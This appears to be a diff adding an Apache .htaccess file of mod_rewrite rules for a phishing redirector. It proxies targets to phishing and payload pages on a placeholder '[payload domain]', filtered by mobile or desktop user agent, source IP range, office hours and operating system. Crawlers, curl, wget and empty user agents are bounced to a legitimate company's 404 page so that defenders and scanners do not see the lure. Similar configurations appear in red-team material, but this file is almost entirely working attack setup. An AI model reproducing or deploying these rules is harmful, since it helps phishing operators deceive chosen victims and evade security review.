@@ -1,0 +1,41 @@
+RewriteEngine On
+# if the request if from a mobile device, proxy to the mobile phishing page
+RewriteCond %{HTTP_USER_AGENT} "android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos" [NC]
+RewriteRule ^.*$ http://www.[payload domain].com/mobile_phishing.html [P]
+# if the request is an abnormal user agent, redirect to the legitimate company website
+RewriteCond %{HTTP_USER_AGENT} "wget|curl|HTTrack|crawl|google|bot|b\-o\-t|spider|baidu" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} =""
+RewriteRule ^.*$ http://www.[real company domain].com/404.html/? [L,R=302]
+# else, proxy to the desktop phishing page
+RewriteRule ^.*$ http://www.[payload domain].com/desktop_phishing.html [P]
+
+# ip filtering
+# if source ip starts with '100.0.0.' OR '100.0.1.' (100.0.0.0/24 OR 100.0.1.0/24), proxy to the phishing page
+RewriteCond %{REMOTE_ADDR} ^100\.0\.0\. [OR]
+RewriteCond %{REMOTE_ADDR} ^100\.0\.1\.
+RewriteRule ^.*$ http://www.[payload domain].com/phishing.html [P]
+# else, redirect to the legitimate company website
+RewriteRule ^.*$ http://www.[real company domain].com/404.html/? [L,R=302]
+
+# time-based filtering
+# if requested between 9am - 5pm local server time, proxy to the phishing page
+RewriteCond %{TIME_HOUR}%{TIME_MIN} >0900
+RewriteCond %{TIME_HOUR}%{TIME_MIN} <1700
+RewriteRule ^.*$ http://www.[payload domain].com/phishing.html [P]
+# else, redirect to the legitimate company website
+RewriteRule ^.*$ http://www.[real company domain].com/404.html/? [L,R=302]
+
+# os filtering
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} "Mac" [NC]
+RewriteRule ^.*$ http://www.[payload domain].com/macos.html [P]
+RewriteCond %{HTTP_USER_AGENT} "X11" [NC]
+RewriteRule ^.*$ http://www.[payload domain].com/unix.html [P]
+RewriteCond %{HTTP_USER_AGENT} "Linux" [NC]
+RewriteRule ^.*$ http://www.[payload domain].com/linux.html [P]
+RewriteCond %{HTTP_USER_AGENT} "windows" [NC]
+RewriteCond %{HTTP_USER_AGENT} "x64|x86_64|win64" [NC]
+RewriteRule ^.*$ http://www.[payload domain].com/windows_x64.html [P]
+RewriteCond %{HTTP_USER_AGENT} "windows" [NC]
+RewriteRule ^.*$ http://www.[payload domain].com/windows_x86.html [P]
+RewriteRule ^.*$ http://www.[real company domain].com/404.html/? [L,R=302]
